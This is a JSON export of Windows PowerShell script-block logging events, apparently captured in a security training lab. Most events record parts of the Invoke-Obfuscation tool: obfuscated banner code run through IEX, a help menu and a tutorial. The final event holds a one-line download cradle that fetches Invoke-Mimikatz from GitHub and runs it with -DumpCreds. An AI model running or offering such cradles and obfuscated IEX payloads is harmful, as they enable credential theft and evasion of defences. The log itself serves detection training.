'36{78Q55@32t61_91{99@104X97{114Q91-32t93}32t93}32t34@110m111@105}115X115-101m114_112@120@69-45{101@107X111m118m110-73Q124Q32X41Q57@51-93Q114_97_104t67t91{44V39Q112_81t109@39}101{99@97}108{112}101}82_45m32_32X52{51Q93m114@97-104{67t91t44t39V98t103V48t39-101}99}97V108}112t101_82_45{32@41X39{41_112t81_109_39m43{39-110t101@112{81t39X43@39t109_43t112_81Q109t101X39Q43m39}114Q71_112{81m109m39@43X39V32Q40}32m39_43_39{114-111m108t111t67{100m110{117Q39_43m39-111-114Q103_101t114@39m43-39{111t70-45}32m41}98{103V48V110Q98t103{48@39{43{39-43{32t98m103_48{111@105t98@103V48-39@43{39_32-32V43V32}32t98t103@48X116m97V99t98X103t48_39V43m39@43-39X43Q39_98@103@48}115V117V102Q98V79m45@98m39Q43{39X103_39X43Q39V48}43-39}43t39}98-103{48V101_107Q39t43X39_111X118X110V39X43}39t98_103{48@43}32_98{103}48{73{98-39@43t39m103_39}43{39{48Q32t39X43X39-32{40V32t41{39Q43V39m98X103{39_43V39{48-116{115Q79{39_43_39}98}103m48{39Q43t39X32X43{32_98@103-39@43m39X48_72-39_43t39V45m39t43Q39_101Q98}103_48-32_39Q43V39V32t39V43}39m43Q32V98X39Q43_39@103_48V39@43Q39@116X73t82V119m98-39{43_39}103Q48X40_46_32m39}40_40{34t59m91@65V114V114@97_121}93Q58Q58V82Q101Q118Q101{114}115_101m40_36_78m55@32t41t32-59{32}73{69V88m32{40t36V78t55}45Q74m111@105-110m32X39V39-32}41'.SpLiT( '{_Q-@t}mXV' ) |ForEach-Object { ([Int]`$_ -AS [Char]) } ) -Join'' )\" -ForegroundColor Cyan\r\n        Start-Sleep -Milliseconds 650\r\n        ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}\r\n        Start-Sleep -Milliseconds 100\r\n        \r\n        Write-Host \"`$N7 =[char[ ] ] `\"noisserpxE-ekovnI| )93]rahC[,'pQm'ecalpeR-  43]rahC[,'bg0'ecalpeR- )')pQm'+'nepQ'+'m+pQme'+'rGpQm'+' ( '+'roloCdnu'+'orger'+'oF- )bg0nbg0'+'+ bg0oibg0'+'  +  bg0tacbg0'+'+'+'bg0sufbO-b'+'g'+'0+'+'bg0ek'+'ovn'+'bg0+ bg0Ib'+'g'+'0 '+' ( )'+'bg'+'0tsO'+'bg0'+' + bg'+'0H'+'-'+'ebg0 '+' '+'+ b'+'g0'+'tIRwb'+'g0(. '((`\";[Array]::Reverse(`$N7 ) ; IEX (`$N7-Join '' )\" -ForegroundColor Magenta\r\n        Start-Sleep -Milliseconds 650\r\n        ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline; Write-Host $Line -NoNewline; Write-Host $Line}\r\n        Start-Sleep -Milliseconds 100\r\n\r\n        Write-Host \".(`\"wRIt`\" +  `\"e-H`\" + `\"Ost`\") (  `\"I`\" +`\"nvoke`\"+`\"-Obfus`\"+`\"cat`\"  +  `\"io`\" +`\"n`\") -ForegroundColor ( 'Gre'+'en')\" -ForegroundColor Yellow\r\n        Start-Sleep -Milliseconds 650\r\n        ForEach($Line in $ArrowAscii) {Write-Host $Line -NoNewline;  Write-Host $Line}\r\n        Start-Sleep -Milliseconds 100\r\n\r\n        Write-Host \"Write-Host `\"Invoke-Obfuscation`\" -ForegroundColor Green\" -ForegroundColor White\r\n        Start-Sleep -Milliseconds 650\r\n        ForEach($Line in $ArrowAscii) {Write-Host $Line}\r\n        Start-Sleep -Milliseconds 100\r\n        \r\n        # Write out below string in interactive format.\r\n        Start-Sleep -Milliseconds 100\r\n        ForEach($Char in [Char[]]'Invoke-Obfuscation')\r\n        {\r\n            Start-Sleep -Milliseconds (Get-Random -Input @(25..200))\r\n            Write-Host $Char -NoNewline -ForegroundColor Green\r\n        }\r\n        \r\n        Start-Sleep -Milliseconds 900\r\n        Write-Host \"\"\r\n        Start-Sleep -Milliseconds 300\r\n        Write-Host\r\n\r\n        # Display primary ASCII art title banner.\r\n        $RandomColor = (Get-Random -Input @('Green','Cyan','Yellow'))\r\n        ForEach($Line in $InvokeObfuscationAscii)\r\n        {\r\n            Write-Host $Line -ForegroundColor $RandomColor\r\n        }\r\n    }\r\n    Else\r\n    {\r\n        # ASCII option in Invoke-Obfuscation interactive console.\r\n\r\n    }\r\n\r\n    # Output tool banner after all ASCII art.\r\n    Write-Host \"\"\r\n    Write-Host \"`tTool    :: Invoke-Obfuscation\" -ForegroundColor Magenta\r\n    Write-Host \"`tAuthor  :: Daniel Bohannon (DBO)\" -ForegroundColor Magenta\r\n    Write-Host \"`tTwitter :: @danielhbohannon\" -ForegroundColor Magenta\r\n    Write-Host \"`tBlog    :: http://danielbohannon.com\" -ForegroundColor Magenta\r\n    Write-Host \"`tGithub  :: https://github.com/danielbohannon/Invoke-Obfuscation\" -ForegroundColor Magenta\r\n    Write-Host \"`tVersion :: 1.8\" -ForegroundColor Magenta\r\n    Write-Host \"`tLicense :: Apache License, Version 2.0\" -ForegroundColor Magenta\r\n    Write-Host \"`tNotes   :: If(!`$Caffeinated) {Exit}\" -ForegroundColor Magenta\r\n}","ScriptBlockId":"a8537f4c-03a8-41a9-a1fd-a3b8bcedaf29","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:55.309551Z"},"EventRecordID":576826,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-F659-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"b5ad9538-ef66-45ff-baaf-04e1e4df91dd","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:56.683712Z"},"EventRecordID":576829,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-F959-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Invoke-Obfuscation","ScriptBlockId":"2f58915e-5689-4527-b50b-65835e631117","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:15:56.745455Z"},"EventRecordID":576830,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-7855-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$_.ModuleType -eq 'Manifest'}","ScriptBlockId":"17b81506-b3a4-41ce-8b76-aaa186f3697f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:16:05.348848Z"},"EventRecordID":576963,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-DB5A-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Function Show-HelpMenu\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays help menu for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-HelpMenu\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-HelpMenu displays help menu for Invoke-Obfuscation.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-HelpMenu\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    # Show Help Menu.\r\n    Write-Host \"`n`nHELP MENU\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :: Available\" -NoNewLine\r\n    Write-Host \" options\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" shown below:`n\"\r\n    ForEach($InputOptionsList in $AllAvailableInputOptionsLists)\r\n    {\r\n        $InputOptionsCommands    = $InputOptionsList[0]\r\n        $InputOptionsDescription = $InputOptionsList[1]\r\n\r\n        # Add additional coloring to string encapsulated by <> if it exists in $InputOptionsDescription.\r\n        If($InputOptionsDescription.Contains('<') -AND $InputOptionsDescription.Contains('>'))\r\n        {\r\n            $FirstPart  = $InputOptionsDescription.SubString(0,$InputOptionsDescription.IndexOf('<'))\r\n            $MiddlePart = $InputOptionsDescription.SubString($FirstPart.Length+1)\r\n            $MiddlePart = $MiddlePart.SubString(0,$MiddlePart.IndexOf('>'))\r\n            $LastPart   = $InputOptionsDescription.SubString($FirstPart.Length+$MiddlePart.Length+2)\r\n            Write-Host \"$LineSpacing $FirstPart\" -NoNewLine\r\n            Write-Host $MiddlePart -NoNewLine -ForegroundColor Cyan\r\n            Write-Host $LastPart -NoNewLine\r\n        }\r\n        Else\r\n        {\r\n            Write-Host \"$LineSpacing $InputOptionsDescription\" -NoNewLine\r\n        }\r\n        \r\n        $Counter = 0\r\n        ForEach($Command in $InputOptionsCommands)\r\n        {\r\n            $Counter++\r\n            Write-Host $Command.ToUpper() -NoNewLine -ForegroundColor Yellow\r\n            If($Counter -lt $InputOptionsCommands.Count) {Write-Host ',' -NoNewLine}\r\n        }\r\n        Write-Host ''\r\n    }\r\n}","ScriptBlockId":"0f384ab6-e650-4ddf-9a54-4b65b3079303","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:16:32.699681Z"},"EventRecordID":577092,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0B57-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$_[1].Trim()}","ScriptBlockId":"725a22ef-4604-4e24-99ac-16fe6c6cf5fd","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:16:32.703008Z"},"EventRecordID":577094,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-BE5B-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$TempUserInput = $TempUserInput.Replace([String]([Char]$_),'')}","ScriptBlockId":"04fef708-258b-47c5-8a6b-f9271db8b804","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:16:32.714067Z"},"EventRecordID":577096,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-BF5B-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$TempUserInput = $TempUserInput.Replace($_,'')}","ScriptBlockId":"17d8e706-916f-4cbd-b7bd-a3c4166bcbd0","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:16:37.997344Z"},"EventRecordID":577142,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-2257-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"Function Show-Tutorial\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nHELPER FUNCTION :: Displays tutorial information for Invoke-Obfuscation.\r\n\r\nInvoke-Obfuscation Function: Show-Tutorial\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nShow-Tutorial displays tutorial information for Invoke-Obfuscation.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Show-Tutorial\r\n\r\n.NOTES\r\n\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    Write-Host \"`n`nTUTORIAL\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :: Here is a quick tutorial showing you how to get your obfuscation on:\"\r\n    \r\n    Write-Host \"`n1) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Load a scriptblock (SET SCRIPTBLOCK) or a script path/URL (SET SCRIPTPATH).\"\r\n    Write-Host \"   SET SCRIPTBLOCK Write-Host 'This is my test command' -ForegroundColor Green\" -ForegroundColor Green\r\n    \r\n    Write-Host \"`n2) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Navigate through the obfuscation menus where the options are in\" -NoNewLine\r\n    Write-Host \" YELLOW\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \".\"\r\n    Write-Host \"   GREEN\" -NoNewLine -ForegroundColor Green\r\n    Write-Host \" options apply obfuscation.\"\r\n    Write-Host \"   Enter\" -NoNewLine\r\n    Write-Host \" BACK\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"CD ..\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to go to previous menu and\" -NoNewLine\r\n    Write-Host \" HOME\" -NoNewline -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewline\r\n    Write-Host \"MAIN\" -NoNewline -ForegroundColor Yellow\r\n    Write-Host \" to go to home menu.`n   E.g. Enter\" -NoNewLine\r\n    Write-Host \" ENCODING\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" & then\" -NoNewLine\r\n    Write-Host \" 5\" -NoNewLine -ForegroundColor Green\r\n    Write-Host \" to apply SecureString obfuscation.\"\r\n    \r\n    Write-Host \"`n3) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" TEST\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"EXEC\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to test the obfuscated command locally.`n   Enter\" -NoNewLine\r\n    Write-Host \" SHOW\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to see the currently obfuscated command.\"\r\n    \r\n    Write-Host \"`n4) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" COPY\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"CLIP\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to copy obfuscated command out to your clipboard.\"\r\n    Write-Host \"   Enter\" -NoNewLine\r\n    Write-Host \" OUT\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to write obfuscated command out to disk.\"\r\n    \r\n    Write-Host \"`n5) \" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \"Enter\" -NoNewLine\r\n    Write-Host \" RESET\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to remove all obfuscation and start over.`n   Enter\" -NoNewLine\r\n    Write-Host \" UNDO\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" to undo last obfuscation.`n   Enter\" -NoNewLine\r\n    Write-Host \" HELP\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \"/\" -NoNewLine\r\n    Write-Host \"?\" -NoNewLine -ForegroundColor Yellow\r\n    Write-Host \" for help menu.\"\r\n    \r\n    Write-Host \"`nAnd finally the obligatory `\"Don't use this for evil, please`\"\" -NoNewLine -ForegroundColor Cyan\r\n    Write-Host \" :)\" -ForegroundColor Green\r\n}","ScriptBlockId":"003ee723-07a1-4cfa-99fb-5c988a90316e","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Invoke-Obfuscation.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:17:12.146289Z"},"EventRecordID":577263,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-BB57-71CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds","ScriptBlockId":"8a4e4a57-b94e-4001-93b2-e74cbfaa4bc4","Path":""}}}
